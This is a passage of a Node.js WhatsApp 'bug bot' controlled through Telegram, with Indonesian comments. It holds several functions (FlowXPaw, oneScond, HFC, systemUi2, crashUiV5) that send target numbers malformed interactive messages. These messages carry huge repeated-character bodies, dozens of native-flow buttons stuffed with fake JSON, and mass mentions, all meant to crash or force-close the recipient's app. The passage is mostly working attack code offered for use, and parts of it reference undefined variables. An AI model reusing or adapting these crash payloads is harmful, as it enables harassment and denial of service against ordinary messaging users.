        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

// --- FUNC FC --- //
let AxpawXForce = JSON.stringify({
    status: true,
    criador: "AxpawXOne",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib_dirty": ["Array"] },
            _evntsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true,
            }
        }
    }
});


async function FlowXPaw(target) {

     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false,
                            },
                            body: {
                                text: " 𝐃𝐑𝐄𝐀𝐃𝐕𝐄𝐈𝐋 GEN 1",
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: AxpawXForce + "\u0000",
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: AxpawXForce + "𝗔𝗽𝗼𝗰𝗮𝗹𝘆𝗽𝘀𝗲",
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await Aii.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }

//~~~~~~~~~~~~~~~~~~~FUNC BUG~~~~~~~~~~~~~~~~~~~\\
async function oneScond(target) {
      let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
          type: "md",
          ws: {
            _events: {
              "CB:ib,,dirty": ["Array"]
            },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
              version: ["Array"],
              browser: ["Array"],
              waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
              sockCectTimeoutMs: 20000,
              keepAliveIntervalMs: 30000,
              logger: {},
              printQRInTerminal: false,
              emitOwnEvents: true,
              defaultQueryTimeoutMs: 60000,
              customUploadHosts: [],
              retryRequestDelayMs: 250,
              maxMsgRetryCount: 5,
              fireInitQueries: true,
              auth: {
                Object: "authData"
              },
              markOnlineOnsockCect: true,
              syncFullHistory: true,
              linkPreviewImageThumbnailWidth: 192,
              transactionOpts: {
                Object: "transactionOptsData"
              },
              generateHighQualityLinkPreview: false,
              options: {},
              appStateMacVerification: {
                Object: "appStateMacData"
              },
              mobile: true
            }
          }
        }
      });
      let stanza = [{
        attrs: {
          biz_bot: "1"
        },
        tag: "bot"
      }, {
        attrs: {},
        tag: "biz"
      }];
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3.2,
              isStatusBroadcast: true,
              statusBroadcastJid: "status@broadcast",
              badgeChat: {
                unreadCount: 9999
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "proto@newsletter",
              serverMessageId: 1,
              newsletterName: `ì•ˆë…•ð‘ð€ððˆð..ðŸ•Šï¸      - ã€½${"ê¥ˆì•ˆë…•ð‘ð€ððˆð..ðŸ•Šï¸ê¥ˆ".repeat(10)}`,
              contentType: 3,
              accessibilityText: `ì•ˆë…•ð—”ð— ð—˜ð—Ÿð—œð—” ð— ð—¢ð——ð——ð—˜ð—¥ð—¦ ********************************""""" ${"ï¹".repeat(102002)}`
            },
            interactiveMessage: {
              contextInfo: {
                businessMessageForwardInfo: {
                  businessOwnerJid: isTarget
                },
                dataSharingContext: {
                  showMmDisclosure: true
                },
                participant: "0@s.whatsapp.net",
                mentionedJid: ["13135550002@s.whatsapp.net"]
              },
              body: {
                text: "" + "ê¦½".repeat(102002) + "".repeat(102002)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "single_select",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "payment_method",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "".repeat(9999),
                  voice_call: "call_galaxy"
                }, {
                  name: "form_message",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "wa_payment_learn_more",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "wa_payment_transaction_details",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "wa_payment_fbpin_reset",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "catalog_message",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "payment_info",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "review_order",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "send_location",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "payments_care_csat",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "view_product",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "payment_settings",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "address_message",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "automated_greeting_message_view_catalog",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "open_webview",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "message_with_link_status",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "payment_status",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "galaxy_costum",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "extensions_message_v2",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "landline_call",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "mpm",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "cta_copy",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "cta_url",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "review_and_pay",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }, {
                  name: "cta_call",
                  buttonParamsJson: venomModsData + "".repeat(9999)
                }]
              }
            }
          }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
      };
      await Aii.relayMessage(target, message, {
        participant: {
          jid: target
        }
      });
    }
// FC Spam
async function HFC(target, ptcp = true) {
  const Vdata = "*æˆ‘å·²æ¿€æ´»æ¢¦å¹»ä¼ è¾“é¾™å·é£Žâ€¼ï¸* *æˆ‘å·²æ¿€æ´»æ¢¦å¹»ä¼ è¾“é¾™å·é£Žâ€¼ï¸* *æˆ‘å·²æ¿€æ´»æ¢¦å¹»ä¼ è¾“é¾™å·é£Žâ€¼ï¸* *æˆ‘å·²æ¿€æ´»æ¢¦å¹»ä¼ è¾“é¾™å·é£Žâ€¼ï¸* *æˆ‘å·²æ¿€æ´»æ¢¦å¹»ä¼ è¾“é¾™å·é£Žâ€¼ï¸* *æˆ‘å·²æ¿€æ´»æ¢¦å¹»ä¼ è¾“é¾™å·é£Žâ€¼ï¸* *æˆ‘å·²æ¿€æ´»æ¢¦å¹»ä¼ è¾“é¾™å·é£Žâ€¼ï¸*"
  
   let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
     message: {
      interactiveMessage: {
       header: {
        title: "",
        hasMediaAttachment: false
       },
       body: {
        text: "ð—”ð— ð—˜ð—Ÿð—œð—” ð— ð—¢ð——ð——ð—˜ð—¥ð—¦ð—¦ðŸ”¥â­‘" + "ê¦¾".repeat(Amount),
       },
       nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [{
          name: "single_select",
          buttonParamsJson: Vdata + "\u0000"
         },
         {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
        {
          name: "galaxy_message",
          buttonParamsJson: Vdata + JSON.stringify({
            flow_action: "navigate",
            flow_action_payload: { screen: "WELCOME_SCREEN" },
            flow_cta: ":)",
            flow_id: "CODENAME",
            flow_message_version: "9",
            flow_token: "CODENAME"
          })
        },
         {
          name: "call_permission_request",
          buttonParamsJson: Vdata + "ð‡ðšð³ðšð³ðžð¥ ð—ð¯ð—ðŸš€â­‘"
         },
        ]
       }
      }
     }
    }
   }, {
    userJid: target,
    quoted: Vkys
   });
            await Aii.relayMessage(target, ptcp ? {
    participant: {
     jid: target
    }
   } : {});     
   console.log(chalk.green("Force Close Spaming Sended"));
}
async function systemUi2(target, Ptcp = true) {
    Aii.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ê¦¾".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ð“Šˆã€˜â‹‰ ð”Žð”¦ð”©ð”©ð”¢ð”¯ð”¥ð”¬ð”¯ð”°ð”¢ â„­ð”¯ð”žð”°ð”¥ â‹Šã€™ð“Š‰",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"â¤ÍŸÍŸÍžÍžð˜¼ð™ˆð™€ð™‡ð™„ð˜¼ ð™„ð™Ž ð˜½ð˜¼ð˜¾ð™†ðŸ”¥\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "ð“Šˆã€˜â‹‰ ð”Žð”¦ð”©ð”©ð”¢ð”¯ð”¥ð”¬ð”¯ð”°ð”¢ â„­ð”¯ð”žð”°ð”¥ â‹Šã€™ð“Š‰",
                                    sections: [
                                        {
                                            title: "ð“Šˆã€˜â‹‰ ð”Žð”¦ð”©ð”©ð”¢ð”¯ð”¥ð”¬ð”¯ð”°ð”¢ â„­ð”¯ð”žð”°ð”¥ â‹Šã€™ð“Š‰",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "ð“Šˆã€˜â‹‰ ð”Žð”¦ð”©ð”©ð”¢ð”¯ð”¥ð”¬ð”¯ð”°ð”¢ â„­ð”¯ð”žð”°ð”¥ â‹Šã€™ð“Š‰" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}

async function crashUiV5(target, Ptcp = true) {
    Aii.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "â¤ÍŸÍŸÍžÍžð˜¼ð™ˆð™€ð™‡ð™„ð˜¼ ð™‰ð™Š ð˜¾ð™Šð™ð™‰ð™ð™€ð™ðŸ”¥" + "@0".repeat(250000) + "ê¦¾".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "ð“Šˆã€˜â‹‰ ð”Žð”¦ð”©ð”©ð”¢ð”¯ð”¥ð”¬ð”¯ð”°ð”¢ â„­ð”¯ð”žð”°ð”¥ â‹Šã€™ð“Š‰"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};

// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("⟐ Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses Connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
    console.log(chalk.bold.white("𝐊𝐇𝐑𝐎𝐍𝐎𝐒 𝐒𝐋𝐀𝐔𝐆𝐇𝐓𝐄𝐑𝐄𝐃"));
    console.log(chalk.bold.white("DEVELOPER:") + chalk.bold.blue("𝗞𝗮𝗹𝘇𝗶𝗼 𝗫 𝗖𝗵𝗮𝗻𝗱𝗿𝗮"));
    console.log(chalk.bold.white("VERSION:") + chalk.bold.blue("1.0\n\n"));
    console.log(chalk.bold.green("Bot Is Running. . ."));
})();